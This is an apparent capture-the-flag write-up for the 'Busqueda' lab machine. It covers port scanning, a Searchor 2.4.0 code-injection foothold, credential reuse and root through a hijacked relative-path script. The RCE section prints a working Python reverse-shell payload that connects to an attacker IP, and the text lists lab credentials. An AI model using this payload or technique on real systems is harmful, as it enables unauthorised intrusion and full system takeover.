# busqueda
## Summary
### System Information
```text
IP: 10.10.11.208
OS: Linux
Hostname: searcher.htb
```

### Credentials
```text
cody:jh1usoih2bkjaspwe92
administrator:yuiu1hoiu4i5ho1uh
```

### Hashes
```text

```

### Ports
```text
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
```

***

## Enumeration
### NMAP

```bash
nmap -sC -sV -v -T4 -oN scans/nmap.txt busqueda.htb
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## svc

### Website
If we try and access the website it doesn't load. If we use `curl` we can see we're being redirected to `searcher.htb`. Let's add this to our `/etc/hosts`.

![](20230621124227202.png)

Now we can view the website.

![](20230621124324376.png)

### RCE

At the bottom of the page we can see it's using `Searchor 2.4.0` which if we quickly lookup has an [RCE exploit](https://github.com/jonnyzar/POC-Searchor-2.4.2).

If we append the malicious payload into the query parameter of the request and add our IP we can get our foothold.

```shell
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.16.5',9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```

![](20230621130524895.png)

Once we forward the request we get our shell.

![](20230621130615173.png)

If we look around on the machine we can find a `.git` directory containing a `config` file which has the credentials `cody:jh1usoih2bkjaspwe92`.

![](20230621131550929.png)

We can also see that there's a `gitea` subdomain. We can add this to `/etc/hosts` and log in as `cody`.

![](20230621132431490.png)

### SSH

We're able to get SSH by using `cody`'s credentials with the `svc` user.

![](20230621135657744.png)

## Privilege Escalation

If we do some enumeration and check our `sudo` permissions we find that we can execute the `system-checkup.py` script as `root`.

![](20230621135733997.png)

If we run the script we get a few options.

![](20230621142539292.png)

`docker-ps` returns currently running docker containers.

![](20230621142614972.png)

### Credentials

If we lookup the format for Docker Inspect online and use it in our command we get `json` information back about the `mysql` docker container. The output contains two passwords.

![](20230621142643170.png)

```text
MYSQL_PASSWORD: yuiu1hoiu4i5ho1uh
MYSQL_ROOT_PASSWORD: jI86kGUuj87guWr3RyF
```

### Gitea Administrator

We can try these passwords against the `gitea` instance with the `administrator` username.

```text
administrator:yuiu1hoiu4i5ho1uh
```

![](20230621144636496.png)

We can view the source for the `system-checkup.py` script that we can run as `root` to get a better idea of what it's doing under the hood. All it's doing it running `full-checkup.sh` using an absolute path. This means we can create our own script with the same name and it will run as long as it's in our current path.

![](20230621143129473.png)

### Relative Path Abuse

If we make a file called `full-checkup.sh` and add a reverse shell in it we can execute it and it will run our script as `root`.

![](20230621143405430.png)

### Root

![](20230621143349698.png)



